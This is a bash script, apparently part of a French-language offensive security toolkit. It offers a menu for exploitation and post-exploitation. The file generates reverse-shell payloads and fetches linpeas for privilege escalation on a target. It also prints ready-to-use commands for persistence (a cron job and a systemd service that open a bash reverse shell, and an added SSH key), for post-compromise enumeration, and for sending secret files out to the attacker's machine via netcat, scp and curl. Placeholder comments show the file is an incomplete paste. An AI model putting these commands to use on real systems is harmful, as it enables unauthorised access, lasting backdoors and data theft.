#!/bin/bash

# ðŸ”¥ EXPLOITATION & POST-EXPLOITATION MENU
exploitation_menu() {
    while true; do
        clear
        show_fox
        echo -e "${RED}ðŸ”¥ EXPLOITATION & POST-EXPLOITATION${NC}"
        echo "=================================="
        
        echo -e "${GREEN}[1]${NC} ðŸ’£ Reverse Shell Generator"
        echo -e "${GREEN}[2]${NC} ðŸ” Privilege Escalation Scanner"
        echo -e "${GREEN}[3]${NC} ðŸŽ­ Persistence & Backdoors"
        echo -e "${GREEN}[4]${NC} ðŸ“Š System Information Gathering"
        echo -e "${GREEN}[5]${NC} ðŸ—ï¸ Password & Hash Cracking"
        echo -e "${GREEN}[6]${NC} ðŸ‘¤ Social Engineering Tools"
        echo -e "${GREEN}[7]${NC} ðŸ” Post-Exploitation Enumeration"
        echo -e "${GREEN}[8]${NC} ðŸ’¾ Data Exfiltration Tools"
        echo -e "${GREEN}[9]${NC} ðŸŒ Routersploit (Exploit Routeurs)"
        echo -e "${GREEN}[0]${NC} â† Retour au menu principal"
        echo ""
        read -r -p "ðŸ¦Š Votre choix: " exploit_choice
        
        case $exploit_choice in
            1) reverse_shell_generator ;;
            2) privilege_escalation_scanner ;;
            3) persistence_backdoors ;;
            4) system_info_gathering ;;
            5) password_hash_cracking ;;
            6) social_engineering_menu ;;
            7) post_exploitation_enum ;;
            8) data_exfiltration_tools ;;
            9) run_routersploit ;;
            0) return ;;
            *)
                echo -e "${RED}âŒ Option invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

# ðŸ’£ REVERSE SHELL GENERATOR
reverse_shell_generator() {
    clear
    local suggested_lhost
    suggested_lhost=$(hostname -I | awk '{print $1}')
    
    echo -e "${RED}ðŸ’£ REVERSE SHELL GENERATOR${NC}"
    echo "========================="
    
    echo -n -e "${YELLOW}ðŸŽ¯ IP d'Ã©coute (LHOST) [dÃ©faut: $suggested_lhost]: ${NC}"
    read -r lhost
    if [[ -z "$lhost" ]]; then
        lhost="$suggested_lhost"
    fi

    echo -n -e "${YELLOW}ðŸ”Œ Port d'Ã©coute (LPORT) [dÃ©faut: 4444]: ${NC}"
    read -r lport
    if [[ -z "$lport" ]]; then
        lport="4444"
    fi
    
    if [[ -z "$lhost" || -z "$lport" ]]; then
        echo -e "${RED}âŒ IP/Port requis${NC}"; sleep 2; return
    fi
    
    echo ""
    echo -e "${CYAN}ðŸ“‹ Choisissez votre payload:${NC}"
    echo -e "${GREEN}[1]${NC} ðŸš Bash"
    echo -e "${GREEN}[2]${NC} ðŸ”— Netcat"
    echo -e "${GREEN}[3]${NC} ðŸ Python 3"
    echo -e "${GREEN}[4]${NC} ðŸ˜ PHP"
    echo -e "${GREEN}[5]${NC} ðŸ’Ž Ruby"
    
    read -r -p "ðŸ¦Š Payload: " payload_choice
    
    local payload_name=""
    local template_file=""

    case $payload_choice in
        1) payload_name="bash";;
        2) payload_name="netcat";;
        3) payload_name="python";;
        4) payload_name="php";;
        5) payload_name="ruby";;
        *)
            echo -e "${RED}âŒ Option invalide !${NC}"; sleep 2; return
            ;;
    esac

    template_file="$SCRIPT_DIR/fox_lib/payload_templates/${payload_name}.tpl"

    if [[ ! -f "$template_file" ]]; then
        echo -e "${RED}âŒ Fichier template introuvable !${NC}"; sleep 2; return
    fi

    # GÃ©nÃ©rer le payload en utilisant sed pour remplacer les placeholders
    local payload_string
    payload_string=$(sed -e "s/LHOST/$lhost/g" -e "s/LPORT/$lport/g" "$template_file")

    echo -e "\n${YELLOW}Payload gÃ©nÃ©rÃ©:${NC}\n$payload_string"
    
    # Sauvegarder le payload
    mkdir -p "$PIHACK_OUTPUT_PATH/exploits"
    local output_file="$PIHACK_OUTPUT_PATH/exploits/${payload_name}_shell_${lport}.txt"
    echo "$payload_string" > "$output_file"
    echo ""
    echo -e "${GREEN}âœ… Payload sauvegardÃ© dans: $output_file${NC}"

    echo ""
    echo -e "${GREEN}ðŸŽ¯ Pour Ã©couter, utilisez cette commande dans un autre terminal:${NC}"
    echo -e "${CYAN}${BOLD}nc -lvnp $lport${NC}"
    echo ""
    
    read -r -p "Appuyez sur EntrÃ©e pour continuer..."
}

# ðŸ” PRIVILEGE ESCALATION SCANNER
privilege_escalation_scanner() {
    local linpeas_url="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
    local tools_dir="$SCRIPT_DIR/tools"
    local linpeas_path="$tools_dir/linpeas.sh"

    clear
    show_fox
    echo -e "${RED}ðŸ” PRIVILEGE ESCALATION SCANNER (linpeas.sh)${NC}"
    echo "=============================================="

    # VÃ©rifier si linpeas.sh existe, sinon le tÃ©lÃ©charger
    if [[ ! -f "$linpeas_path" ]]; then
        echo -e "${YELLOW}linpeas.sh non trouvÃ©.${NC}"
        echo -e "${CYAN}ðŸŒ€ TÃ©lÃ©chargement depuis $linpeas_url...${NC}"
        mkdir -p "$tools_dir"
        if curl -sL "$linpeas_url" -o "$linpeas_path"; then
            chmod +x "$linpeas_path"
            echo -e "${GREEN}âœ… TÃ©lÃ©chargement et installation de linpeas.sh terminÃ©s.${NC}"
        else
            echo -e "${RED}âŒ Ã‰chec du tÃ©lÃ©chargement. Veuillez vÃ©rifier votre connexion internet.${NC}"
            read -r -p "Appuyez sur EntrÃ©e pour continuer..."
            return
        fi
    else
        echo -e "${GREEN}âœ… linpeas.sh est dÃ©jÃ  prÃ©sent dans $tools_dir${NC}"
    fi

    echo ""
    echo -e "${YELLOW}--- COMMENT UTILISER LINPEAS ---${NC}"
    echo "Linpeas doit Ãªtre exÃ©cutÃ© sur la machine CIBLE."
    echo ""
    echo -e "${CYAN}1. DÃ©marrez un serveur web sur VOTRE machine pour hÃ©berger le script:${NC}"
    echo -e "   (Ouvrez un NOUVEAU terminal et exÃ©cutez cette commande)"
    echo -e "   ${GREEN}cd $tools_dir && python3 -m http.server 8000${NC}"
    echo ""
    
    local your_ip
    your_ip=$(hostname -I | awk '{print $1}')
    echo -e "${CYAN}2. Sur la machine CIBLE, tÃ©lÃ©chargez et exÃ©cutez le script:${NC}"
    echo -e "   (Vous avez besoin d'un shell sur la cible pour faire Ã§a)"
    echo -e "   ${GREEN}wget http://$your_ip:8000/linpeas.sh -O /tmp/linpeas.sh${NC}"
    echo -e "   ${GREEN}chmod +x /tmp/linpeas.sh${NC}"
    echo -e "   ${GREEN}./tmp/linpeas.sh${NC}"
    echo ""
    echo -e "${YELLOW}Les rÃ©sultats s'afficheront directement sur le terminal de la cible.${NC}"
    echo ""

    read -r -p "Appuyez sur EntrÃ©e pour revenir au menu..."
}

# ðŸŽ­ PERSISTENCE & BACKDOORS
persistence_backdoors() {
    clear
    show_fox
    echo -e "${RED}ðŸŽ­ PERSISTENCE & BACKDOORS (GUIDE)${NC}"
    echo "======================================"
    echo -e "${YELLOW}La persistance consiste Ã  maintenir l'accÃ¨s Ã  une machine compromise."
    echo -e "${YELLOW}Voici quelques techniques courantes. Ã€ exÃ©cuter sur la CIBLE.${NC}"
    echo ""

    echo -e "${CYAN}--- 1. Cron Job (TÃ¢che planifiÃ©e) ---${NC}"
    echo "CrÃ©e une tÃ¢che qui exÃ©cute un reverse shell toutes les minutes."
    echo -e "   ${GREEN}(crontab -l 2>/dev/null; echo \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/VOTRE_IP/VOTRE_PORT 0>&1'\") | crontab -${NC}"
    echo ""

    echo -e "${CYAN}--- 2. Service Systemd ---${NC}"
    echo "CrÃ©e un service qui se lance au dÃ©marrage."
    echo -e "   a. CrÃ©ez le fichier de service sur la cible : ${GREEN}nano /etc/systemd/system/revshell.service${NC}"
    echo -e "   b. Contenu du fichier (Ã  adapter):"
    echo -e "      ${BOLD}[Unit]${NC}"
    echo -e "      Description=Reverse Shell
"
    echo -e "      ${BOLD}[Service]${NC}"
    echo -e "      ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/VOTRE_IP/VOTRE_PORT 0>&1'"
    echo -e "      Restart=always
"
    echo -e "      ${BOLD}[Install]${NC}"
    echo -e "      WantedBy=multi-user.target
"
    echo -e "   c. Activez et dÃ©marrez le service:"
    echo -e "      ${GREEN}sudo systemctl enable --now revshell.service${NC}"
    echo ""

    echo -e "${CYAN}--- 3. Ajout de clÃ© SSH ---${NC}"
    echo "Ajoute votre clÃ© publique SSH pour un accÃ¨s direct."
    echo -e "   ${GREEN}echo \"VOTRE_CLE_PUBLIQUE_SSH\" >> /home/UTILISATEUR/.ssh/authorized_keys${NC}"
    echo ""

    read -r -p "Appuyez sur EntrÃ©e pour revenir au menu..."
}

# ðŸ” POST-EXPLOITATION ENUMERATION
post_exploitation_enum() {
    clear
    show_fox
    echo -e "${RED}ðŸ” POST-EXPLOITATION ENUMERATION (GUIDE)${NC}"
    echo "==========================================="
    echo -e "${YELLOW}Une fois sur la cible, collectez un maximum d'informations.${NC}"
    echo ""

    echo -e "${CYAN}--- Informations SystÃ¨me ---${NC}"
    echo -e "   ${GREEN}uname -a${NC}              # Version du noyau"
    echo -e "   ${GREEN}ps aux${NC}                 # Processus en cours"
    echo -e "   ${GREEN}netstat -antup${NC}         # Connexions rÃ©seau"
    echo -e "   ${GREEN}cat /etc/passwd${NC}        # Liste des utilisateurs"
    echo -e "   ${GREEN}cat /etc/crontab${NC}       # TÃ¢ches planifiÃ©es systÃ¨me"
    echo ""

    echo -e "${CYAN}--- Informations Utilisateur ---${NC}"
    echo -e "   ${GREEN}whoami && id${NC}           # Qui suis-je ?"
    echo -e "   ${GREEN}sudo -l${NC}                # Droits sudo"
    echo -e "   ${GREEN}history${NC}                # Historique des commandes"
    echo -e "   ${GREEN}ls -la /home/*/.ssh/${NC}   # Chercher des clÃ©s SSH"
    echo ""

    echo -e "${CYAN}--- Recherche de Fichiers IntÃ©ressants ---${NC}"
    echo -e "   ${GREEN}find / -name '*.conf' -ls 2>/dev/null${NC}    # Fichiers de configuration"
    echo -e "   ${GREEN}find / -name '*.bak' -ls 2>/dev/null${NC}     # Fichiers de sauvegarde"
    echo -e "   ${GREEN}find /var/www -name '*.php' -ls 2>/dev/null${NC} # Fichiers web"
    echo ""

    read -r -p "Appuyez sur EntrÃ©e pour revenir au menu..."
}

# Alias pour le menu
system_info_gathering() {
    post_exploitation_enum
}

# Raccourci vers le menu de cracking
password_hash_cracking() {
    password_menu
}

# ðŸ’¾ DATA EXFILTRATION TOOLS
data_exfiltration_tools() {
    clear
    show_fox
    echo -e "${RED}ðŸ’¾ DATA EXFILTRATION (GUIDE)${NC}"
    echo "=================================="
    echo -e "${YELLOW}Comment faire sortir des donnÃ©es d'une machine cible.${NC}"
    echo ""

    local your_ip
    your_ip=$(hostname -I | awk '{print $1}')

    echo -e "${CYAN}--- 1. Netcat (Fichier unique) ---${NC}"
    echo -e "   Sur VOTRE machine (Ã©coute): ${GREEN}nc -lvnp 9001 > fichier_recu${NC}"
    echo -e "   Sur la CIBLE (envoi):     ${GREEN}nc $your_ip 9001 < /chemin/vers/le/fichier/secret${NC}"
    echo ""

    echo -e "${CYAN}--- 2. SCP (Secure Copy, si SSH est dispo) ---${NC}"
    echo -e "   Sur la CIBLE: ${GREEN}scp /chemin/vers/le/fichier/secret utilisateur@$your_ip:/chemin/local${NC}"
    echo ""

    echo -e "${CYAN}--- 3. Exfiltration via HTTP (dossier complet) ---${NC}"
    echo -e "   Sur la CIBLE: ${GREEN}tar -czf /tmp/archive.tar.gz /chemin/du/dossier/secret${NC}"
    echo -e "   Sur la CIBLE: ${GREEN}curl -X POST --data-binary @/tmp/archive.tar.gz http://$your_ip:8000${NC}"
    echo -e "   (NÃ©cessite un serveur web qui Ã©coute sur votre machine)"
    echo ""

    read -r -p "Appuyez sur EntrÃ©e pour revenir au menu..."
}

# ... (le reste du fichier reste un guide de rÃ©fÃ©rence et n'a pas besoin de modifications)
# ... (coller le reste du fichier ici) ...

# ðŸŒ ROUTERSPLOIT LAUNCHER
run_routersploit() {
    local rsf_path="${SCRIPT_DIR}/../tools/routersploit/rsf.py"
    if [[ ! -f "$rsf_path" ]]; then
        echo -e "${RED}âŒ Routersploit non trouvÃ© !${NC}"
        echo -e "${YELLOW}ðŸ’¡ Assurez-vous qu'il est clonÃ© dans scripts/tools/routersploit${NC}"
        sleep 3; return
    fi
    clear
    echo -e "${CYAN}ðŸš€ Lancement de Routersploit...${NC}"
    python3 "$rsf_path"
    press_enter_to_continue
}
